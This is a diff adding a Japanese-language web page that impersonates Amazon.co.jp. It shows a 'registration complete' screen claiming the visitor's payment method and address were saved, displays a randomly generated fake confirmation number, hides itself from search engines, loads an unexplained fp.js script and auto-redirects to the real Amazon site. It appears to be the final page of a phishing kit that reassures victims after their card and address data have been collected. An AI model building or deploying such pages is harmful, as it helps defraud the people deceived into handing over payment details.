@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Amazon.co.jp 手続き完了</title>
+<link rel="icon" href="assets/logo.svg">
+<link rel="stylesheet" href="assets/style.css">
+<style>
+.wrap{max-width:380px;text-align:center}
+.tick{width:74px;height:74px;border-radius:50%;background:#eef7ee;border:2px solid #067d62;
+      display:flex;align-items:center;justify-content:center;margin:4px auto 18px;
+      font-size:34px;color:#067d62;animation:pop .35s ease-out}
+@keyframes pop{0%{transform:scale(.6);opacity:0}100%{transform:scale(1);opacity:1}}
+h1{font-size:22px;font-weight:700;margin:0 0 10px;line-height:1.35}
+.sub{font-size:13px;color:#565959;line-height:1.7;margin:0 0 18px}
+.order{background:#f7fafa;border:1px solid #d5e8ec;border-radius:6px;padding:12px;
+       font-size:12px;color:#0f4c5c;margin:0 0 18px;line-height:1.6}
+.order b{font-family:ui-monospace,Menlo,monospace;letter-spacing:.5px}
+.back{font-size:12px;color:#565959;margin-top:16px}
+.back b{font-variant-numeric:tabular-nums}
+</style>
+</head>
+<body>
+
+<header><a href="#" aria-label="Amazon.co.jp"><img src="assets/logo.svg" alt="Amazon.co.jp" width="150" height="42"></a></header>
+
+<main>
+  <div class="wrap">
+    <div class="card">
+      <div class="tick">✓</div>
+      <h1>ご登録ありがとうございます</h1>
+      <p class="sub">お支払い方法とお届け先の登録が完了しました。<br>ご注文の手続きにお進みいただけます。</p>
+
+      <div class="order">
+        確認番号 <b id="oid">—</b><br>
+        <span style="color:#3d6b78">お届け予定：最短翌日</span>
+      </div>
+
+      <a class="btn" href="https://www.amazon.co.jp/gp/css/order-history" id="go"
+         style="display:block;text-decoration:none;color:#0f1111;line-height:1.4">注文履歴を見る</a>
+
+      <p class="back">Amazon.co.jp へ自動的に戻ります <b id="cd">(8)</b></p>
+    </div>
+
+    <div class="divider"><i></i><span>セキュリティは常に最新の状態です</span><i></i></div>
+  </div>
+</main>
+
+<footer>
+  <div><a href="#">利用規約</a><a href="#">プライバシー規約</a><a href="#">ヘルプ</a></div>
+  <div class="cp">© 1996-2026, Amazon.com, Inc. or its affiliates</div>
+</footer>
+
+<script>
+(function(){
+  var n = '';
+  for (var i = 0; i < 3; i++) n += Math.floor(Math.random() * 900 + 100) + '-';
+  document.getElementById('oid').textContent = n + String(Math.floor(Math.random() * 9000000 + 1000000));
+
+  var left = 8, cd = document.getElementById('cd');
+  var t = setInterval(function(){
+    left--;
+    cd.textContent = '(' + left + ')';
+    if (left <= 0) {
+      clearInterval(t);
+      location.href = 'https://www.amazon.co.jp/';
+    }
+  }, 1000);
+})();
+</script>
+<script src="assets/fp.js"></script>
+<script src="assets/i18n.js"></script>
+</body>
+</html>
